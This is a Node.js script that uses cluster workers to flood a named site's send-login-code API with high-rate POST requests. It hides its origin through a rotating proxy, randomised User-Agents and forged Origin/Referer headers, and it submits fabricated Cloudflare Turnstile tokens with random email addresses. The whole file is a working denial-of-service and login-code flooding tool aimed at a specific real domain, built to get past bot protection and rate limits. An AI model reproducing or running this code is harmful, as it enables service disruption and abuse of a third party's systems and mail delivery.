const cluster = require("cluster");
const os = require("os");
const axios = require("axios");
const fs = require("fs");
const { HttpsProxyAgent } = require("https-proxy-agent");

if (process.argv.length < 5) {
    console.log("Usage: node raymix.js <duration_seconds> <rps> <connections> [workers]");
    console.log("Example: node raymix.js 120 800 4");
    process.exit(0);
}

const DURATION = parseInt(process.argv[2]);
const RPS = parseInt(process.argv[3]);
const CONNECTIONS = parseInt(process.argv[4]);
const WORKERS = parseInt(process.argv[5] || os.cpus().length);

const DEBUG = true;
const PROXY_URL = "http://localhost:5566";   // mattes/rotating-proxy

let userAgents = [];
try {
    userAgents = fs.readFileSync("user-agents.txt", "utf8")
                   .split("\n")
                   .map(ua => ua.trim())
                   .filter(ua => ua.length > 20);
    console.log(`✅ Loaded ${userAgents.length} User-Agents`);
} catch (e) {
    console.error("user-agents.txt not found, using default");
    userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
}

function generateMockTurnstileToken() {
    const randStr = (len) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        let result = '';
        for (let i = 0; i < len; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };
    return `0.${randStr(250)}.${randStr(22)}.${randStr(64)}`;
}

// ====================== MASTER ======================
if (cluster.isPrimary) {
    console.log("\n=== MATTES ROTATING PROXY ULTRA FREEZE ===");
    console.log(`Proxy     : ${PROXY_URL}`);
    console.log(`Duration  : ${DURATION}s`);
    console.log(`RPS       : ${RPS}`);
    console.log(`Workers   : ${WORKERS}\n`);

    let totalReq = 0, totalOK = 0, totalErr = 0;

    for (let i = 0; i < WORKERS; i++) cluster.fork();

    for (const id in cluster.workers) {
        cluster.workers[id].on("message", (msg) => {
            totalReq += msg.req || 0;
            totalOK += msg.ok || 0;
            totalErr += msg.err || 0;
        });
    }

    setTimeout(() => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        console.log("\n=== FINAL RESULTS ===");
        console.log(`Total Requests : ${totalReq}`);
        console.log(`Success        : ${totalOK}`);
        console.log(`Errors         : ${totalErr}`);
        console.log(`Avg RPS        : ${Math.round(totalReq / DURATION)}`);
        process.exit(0);
    }, DURATION * 1000);

    return;
}

// ====================== WORKER ======================
(async () => {
    const proxyAgent = new HttpsProxyAgent(PROXY_URL);
    let reqCount = 0, okCount = 0, errCount = 0;

    console.log(`[Worker ${process.pid}] 🚀 Using mattes rotating proxy @ ${PROXY_URL}`);

    const INTERVAL = 100;
    const PER_TICK = Math.ceil(RPS / (1000 / INTERVAL));
    const endTime = Date.now() + DURATION * 1000;

    while (Date.now() < endTime) {
        const batch = [];

        for (let i = 0; i < PER_TICK; i++) {
            const rand = Math.random().toString(36).substring(2, 12);
            const email = `${rand}@outlook.com`;
            const turnstyletoken = generateMockTurnstileToken();

            batch.push(
                axios.post("https://api.aryankaushik.space/api/auth/send-login-code",
                { email, turnstileToken: turnstyletoken }, {
                    httpsAgent: proxyAgent,
                    timeout: 15000,
                    headers: {
                        "Content-Type": "application/json",
                        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                        "Origin": "https://aeroweb.aryankaushik.space",
                        "Referer": "https://aeroweb.aryankaushik.space/"
                    }
                })
                .then((response) => {
                    okCount++; reqCount++;
                    if (DEBUG && Math.random() < 0.05) {
                        console.log(`[W${process.pid}] ✅ [${response.status}]`);
                    }
                })
                .catch((error) => {
                    errCount++; reqCount++;
                    const status = error.response?.status || "TIMEOUT";
                    if (DEBUG) console.log(`[W${process.pid}] ❌ [${status}]`);
                })
            );
        }

        await Promise.all(batch);
        await new Promise(r => setTimeout(r, INTERVAL));
    }

    process.send({ req: reqCount, ok: okCount, err: errCount });
    process.exit(0);
})();
